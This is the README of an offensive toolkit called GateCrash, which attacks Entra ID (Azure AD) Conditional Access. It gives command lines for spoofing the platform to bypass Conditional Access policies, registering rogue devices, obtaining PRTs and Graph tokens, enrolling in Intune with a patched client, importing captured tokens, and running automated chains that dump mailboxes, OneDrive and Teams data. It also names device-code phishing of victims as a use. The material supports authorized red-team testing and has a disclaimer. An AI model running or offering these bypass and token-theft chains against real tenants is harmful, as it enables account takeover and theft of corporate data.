# GateCrash

Entra ID (Azure AD) Conditional Access assessment framework. Fingerprints CA policies,
discovers platform bypasses, registers rogue devices, obtains PRTs and Graph tokens,
enrolls in Intune, extracts corporate intel over SyncML, and dumps M365 data.

Built from 338+ real tests across 38+ categories. **Tenant-agnostic**: every target value
reads from `config.yaml` at runtime. Point it at your own tenant and run.

**Authorized use only.** Never run against a target without written approval.

## Platform Support

| Platform | Core (recon, requests-bypass, tokens, report) | Selenium bypass | Device reg + PRT | Intune/SyncML |
|----------|-----------------------------------------------|-----------------|------------------|---------------|
| **Windows** | Full | Full (headless Chrome) | Full (with roadtx) | Limited |
| **Kali / Linux** | Full | Full | Full (with roadtx) | Full (pytune) |
| **WSL** | Full | Full (headless) | Full (with roadtx) | Full (pytune) |
| **macOS** | Full | Full | Full (with roadtx) | Limited |

**Most modules are pure Python** and run anywhere. Kali/WSL is only needed for:
- `pytune` (Intune MDM enrollment, Linux-only)
- Operators who prefer the full offensive toolkit on Kali

## Quick Start

```bash
# 1. Clone
git clone https://github.com/yourusername/GateCrash && cd GateCrash

# 2. Install (creates venv + deps + runs smoke test)
# Linux / macOS / WSL / Kali:
bash install.sh

# Windows (PowerShell):
# .\install.ps1

# 3. Configure
cp config.example.yaml config.yaml
# Edit config.yaml: set tenant_id, username, password (or export AZCA_PASSWORD)

# 4. Run recon (no MFA needed, safe first step)
python -u cli.py recon --config config.yaml --sweep
```

Or install manually:

```bash
pip install -r requirements.txt
python test_smoke.py
```

## Requirements

**Python 3.10+** with these packages (all in `requirements.txt`):

| Package | Purpose |
|---------|---------|
| `requests` | HTTP client for all Azure AD API calls |
| `pyjwt` | JWT decode/sign (token inspection, jwt-bearer flow) |
| `cryptography` | KBKDFHMAC for PRT cookies, JWE decrypt, CSR/cert for device reg |
| `selenium` | Browser-based platform bypass (optional; `requests-*` methods work without it) |
| `pyyaml` | Config file parsing |

**Optional external tools** (shelled out to, not imported):
- `roadtx` : device registration + PRT acquisition (`pip install roadtx`)
- `pytune` : Intune MDM enrollment / SyncML checkin (Linux only, manual install).
  **Ships with patched pytune** in `vendor/pytune_patches/` that bypasses CA-blocked
  Graph API calls during enrollment. See `vendor/pytune_patches/README.md` for setup

**Selenium note**: the `requests-*` bypass methods (requests-ios, requests-macos, requests-android)
need no browser at all. Install Selenium + chromedriver only if you want the `selenium-*` methods.

## Configuration

Copy `config.example.yaml` to `config.yaml` and fill in:

```yaml
tenant_id: "contoso.onmicrosoft.com"   # or the GUID
username: "user@contoso.com"
password: "hunter2"                     # or export AZCA_PASSWORD for special chars
```

Passwords with `$`, `^`, `!` should use the env var (`export AZCA_PASSWORD='p@ss!'`) to avoid
shell escaping issues.

See `config.example.yaml` for all options (Selenium paths, MFA timeout, PRT/device config).

## Commands

### Recon (start here)

```bash
# Quick probe: 3 platforms x 2 resources
python -u cli.py recon --config config.yaml --quick

# Full sweep: 6 platforms x 39 resources (no MFA needed)
python -u cli.py recon --config config.yaml --sweep

# FOCI client sweep: test ALL 20+ first-party Microsoft clients for CA gaps
python -u cli.py recon --config config.yaml --all-clients

# Combined: all clients x all resources (finds client-specific CA gaps)
python -u cli.py recon --config config.yaml --sweep --all-clients
```

Recon also probes device-code flow and legacy SMTP/IMAP automatically.

### Platform Bypass

```bash
# Pure requests (no browser needed, works anywhere)
python -u cli.py bypass --config config.yaml --method requests-ios
python -u cli.py bypass --config config.yaml --method requests-macos
python -u cli.py bypass --config config.yaml --method requests-android

# Selenium (real browser, handles JS-heavy flows)
python -u cli.py bypass --config config.yaml --method selenium-macos
python -u cli.py bypass --config config.yaml --method selenium-ios
python -u cli.py bypass --config config.yaml --method selenium-android
```

### Device Code Flow

```bash
# Device-code auth (user approves on another device, bypasses local CA)
python -u cli.py device-code --config config.yaml
python -u cli.py device-code --config config.yaml --scope exchange
python -u cli.py device-code --config config.yaml --client azure_cli --scope graph
```

Useful for: phishing scenarios (send victim the code), bypassing local device-compliance CA,
or when ROPC is blocked but device-code isn't. Recon automatically detects if this flow is allowed.

### Device Registration + PRT

```bash
# DRS token (CA-exempt, MFA only)
python -u cli.py drs --config config.yaml

# Native device registration (uses DRS token from recon/drs)
python -u cli.py device-reg --config config.yaml --native

# PRT broker flow (needs PRT from device-reg or roadtx)
python -u cli.py prt-flow --config config.yaml --resource graph
```

### Post-Exploitation

```bash
# Enumerate with a stored token
python -u cli.py enumerate --config config.yaml --token graph

# Import external tokens (MadApe, roadtx, manual)
python -u cli.py import --config config.yaml --token captured.json

# Parse SyncML checkin for corporate intel
python -u cli.py syncml-intel --config config.yaml --file checkin.txt
```

### Token Management

```bash
# List all captured tokens (audience, UPN, expiry, refresh status)
python -u cli.py tokens --config config.yaml
```

Shows every token with export instructions for roadtx, curl, and AzureHound.

### Automated Chains

```bash
# Auto: recon -> bypass -> pivot ALL resources -> enumerate ALL tokens -> report
python -u cli.py auto --config config.yaml

# Full chain: recon -> drs -> device-reg -> intune -> bypass -> pivot ALL -> enumerate ALL -> report
python -u cli.py full-chain --config config.yaml
```

Both `auto` and `full-chain` now **automatically chain tokens**: every step that yields a
refresh token pivots it to all reachable resources (Graph, Exchange, SharePoint, Intune,
Azure Management, etc.), and at the end they enumerate with every token they have. On a
less-strict tenant that allows device registration or direct authentication, the framework
will get Graph, dump mailbox, OneDrive, Teams, etc. without manual intervention.

### Report

```bash
python -u cli.py report --config config.yaml
# Outputs: output/<engagement>/reports/report.json + report.md
```

## How It Works

### Module Chain

Everything flows through the engagement output dir (`output/<engagement_name>/`):

```
tokens/    - stored access/refresh tokens (JSON, MadApe-compatible)
certs/     - device certs, keys, PFX files
evidence/  - raw HTML captures, API responses, recon matrices
reports/   - final JSON + Markdown reports
```

Each module saves what the next one reads. Recon saves direct tokens (DRS gives 200
on all platforms); bypass saves Graph tokens; enumerate and report read them.

### Decision Tree (after recon)

```
recon results:
  200 (direct token)   -> enumerate immediately
  50076 (MFA only)     -> platform bypass exists -> bypass (Selenium or requests)
  53003 (CA blocked)   -> no bypass at ROPC level -> device-reg + prt-flow + drs
  50126 / 50034        -> bad creds or unknown user -> stop
```

### Vulnerability Catalog

The report generates these findings automatically based on evidence:

| ID | Severity | What |
|----|----------|------|
| VULN-01 | Critical (9.1) | CA platform misconfiguration: mobile/macOS exempt from device compliance |
| VULN-02 | High (7.5) | DRS CA exemption enables rogue device registration (10yr cert) |
| VULN-03 | High (7.3) | Intune MDM enrollment from external unmanaged device |
| VULN-04 | High (7.1) | Corporate data exposure via SyncML management channel |
| VULN-05 | Medium (5.3) | DRS accepts unauthorized compliance write (non-propagating) |
| VULN-06 | Medium (5.0) | AAD group/role disclosure via DRS JWT claims |
| VULN-07 | High (7.4) | Legacy authentication enabled (SMTP/IMAP bypass CA) |
| VULN-08 | Medium (5.5) | CA policy does not cover all first-party clients (FOCI gap) |
| VULN-09 | Medium (5.8) | Device-code flow allowed (bypasses local CA/device compliance) |

## Architecture

```
cli.py                  - entry point, routes subcommands
config.py               - YAML loader, env var override
lib/
  clients.py            - client_id DB, resource URIs, pivot scopes (~39 resources)
  oauth.py              - ROPC v1/v2, code exchange, refresh, device code
  kdf.py                - KBKDFHMAC (NIST SP800-108) for PRT cookies
  jwe.py                - AES-256-GCM/CBC JWE decryption
  errors.py             - Azure AD error code DB (50076, 53003, 530003, etc.)
  ua.py                 - platform User-Agent strings
  devicekeys.py         - RSA key gen, CSR, BCRYPT_RSAPUBLIC_BLOB TransportKey
  util.py               - JWT decode, Engagement dirs, MFA file writer
modules/
  recon.py              - CA fingerprinting (platform x client x resource matrix)
  platform_bypass.py    - Selenium-based platform CA bypass
  requests_bypass.py    - Pure-requests platform CA bypass (no browser)
  prt_broker.py         - PRT broker auth (SAS MFA + JWE decrypt + jwt-bearer)
  drs_ops.py            - DRS token + compliance PATCH
  device_reg.py         - Native DRS device registration + PRT via roadtx
  mfa_handler.py        - SAS BeginAuth/EndAuth/ProcessAuth (number matching)
  token_ops.py          - Token normalize, store, refresh, import
  post_ex.py            - Graph/Exchange/SharePoint/Azure enumeration + SyncML intel
  intune_ops.py         - Intune MDM enrollment + SyncML checkin (pytune)
  reporting.py          - VULN-01..09 catalog, CA matrix, Markdown report
```

## Hard-Won Constraints

These are baked into the code from real testing. Violating them breaks things:

- **KBKDFHMAC** for PRT KDF, not manual `hmac.new()` (lib/kdf.py)
- **ProcessAuth** uses `data={}` (form POST), never `json={}` (causes AADSTS90014)
- **jwt-bearer** payload goes INSIDE the signed JWT, not in the POST body
- **MFA number** is written to stdout AND a file immediately, never buffered
- **DRS PATCH** returns 200 but does NOT propagate compliance to the AAD device object
- **response_mode=query** for Selenium (form_post loses the code if JS auto-submits)
- **Gotcha #7**: ROPC evaluates platform from UA (spoofable), but interactive authorize re-evaluates BOTH UA and device compliance. A tenant that shows 50076 at ROPC may still block at 530003 interactively

## Self-Tests

```bash
# Unit tests (no network, no credentials)
python -m lib.kdf && python -m lib.jwe && python -m lib.errors
python test_smoke.py

# Live test against your own tenant
python -u cli.py recon --config config.yaml --quick
```

## References

- `PROTOCOLS.md` : exact HTTP request/response sequences, pseudocode for every crypto op
- `DEAD_ENDS.md` : techniques that fail against well-configured tenants (don't re-chase)
